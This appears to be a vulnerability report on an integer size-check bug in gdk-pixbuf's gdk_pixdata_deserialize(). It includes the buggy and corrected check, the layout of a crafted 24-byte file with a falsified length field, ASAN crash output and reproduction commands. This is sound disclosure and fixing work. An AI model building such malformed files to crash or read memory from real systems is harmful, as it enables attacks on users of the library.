# VULN 003 - Off-by-Header-Length Integer Check in gdk_pixdata_deserialize

## Status
**VERIFIED_CRASH** - ASAN heap-buffer-overflow-read confirmed.

## Vulnerability
- **File**: `gdk-pixbuf/gdk-pixdata.c` line 235
- **CWE**: CWE-131 (Incorrect Calculation of Buffer Size)
- **Function**: `gdk_pixdata_deserialize()`

### Buggy check (line 235):
```c
if (stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH)
    return_pixel_corrupt (error);
```

### Correct check:
```c
if (stream_length < pixdata->length)
    return_pixel_corrupt (error);
```

### Bypass window
The check passes when `stream_length >= pixdata->length - 24` but not when
`stream_length >= pixdata->length`. This creates a bypass window of K bytes
(1 <= K <= 24) where K = `pixdata->length - stream_length`.

## Attack Used (K=24, maximum bypass)

### File: `vuln_003.gdkp` (24 bytes - header only)
| Field        | Value       | Notes                         |
|-------------|-------------|-------------------------------|
| magic       | 0x47646b50  | "GdkP"                        |
| length      | 48          | LIES: claims 24 extra bytes   |
| pixdata_type| 0x01010002  | RGBA, 8-bit, RAW encoding     |
| rowstride   | 400         | 100 pixels * 4 bytes per row  |
| width       | 100         |                               |
| height      | 100         |                               |

No pixel data follows — the file ends after the 24-byte header.

### Check bypass arithmetic
- `stream_length` = 24 (actual file size passed to `gdk_pixdata_deserialize`)
- `pixdata->length` = 48 (as declared in header)
- Check: `24 < 48 - 24 = 24` → `24 < 24` → **FALSE** → check PASSES (bug exploited!)
- Correct check: `24 < 48` → **TRUE** → would correctly reject the file

### Downstream OOB read
After the buggy check passes:
1. `pixdata->pixel_data = stream + 24` — pointer past end of 24-byte input buffer
2. `gdk_pixbuf_from_pixdata()` is called with RAW encoding + `copy_pixels=TRUE`
3. `memcpy(data, pixdata->pixel_data, rowstride * height)` → reads 40,000 bytes
4. Reads 40,000 bytes starting from 0 bytes past the end of the 128-byte stream buffer

## ASAN Output
```
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c000000840
READ of size 40000 at 0x50c000000840 thread T0
    #0 __interceptor_memcpy
    #1 gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xad3ca)
    #2 try_load (libgdk_pixbuf-2.0.so.0+0xc74fb)
    #3 pixdata_image_load_increment
    #4 generic_load_incrementally
    #5 _gdk_pixbuf_generic_image_load
    #6 gdk_pixbuf_new_from_file
    #7 main (gdk-pixbuf-pixdata)

0x50c000000840 is located 0 bytes to the right of 128-byte region
```

## What Did NOT Work (Initial K=24 RLE Attempt)
The original attack used RLE encoding with a 1×1 image. That failed because:
1. The GString-based stream buffer was allocated 128 bytes (by the generic loader)
   for a 24-byte file, so `stream[24]` was within the allocation.
2. The RLE decoder read the garbage byte at `stream[24]` without triggering ASAN.
3. GdkPixbuf's own `check_overrun` guard in the RLE decoder caught the invalid data
   and returned "Image pixel data corrupt" before any detectable OOB crash.

## Fix Applied (RAW encoding + large image)
Using RAW encoding (`GDK_PIXDATA_ENCODING_RAW`) bypasses the `check_overrun` guard,
and using a 100×100 image forces a 40,000-byte `memcpy` that reads far past the
128-byte buffer, reliably triggering ASAN.

## Reproducing
```bash
python3 vuln_003_gen.py   # generates vuln_003.gdkp (24 bytes)
bash vuln_003_run.sh      # triggers crash, writes asan_003.log.*
```
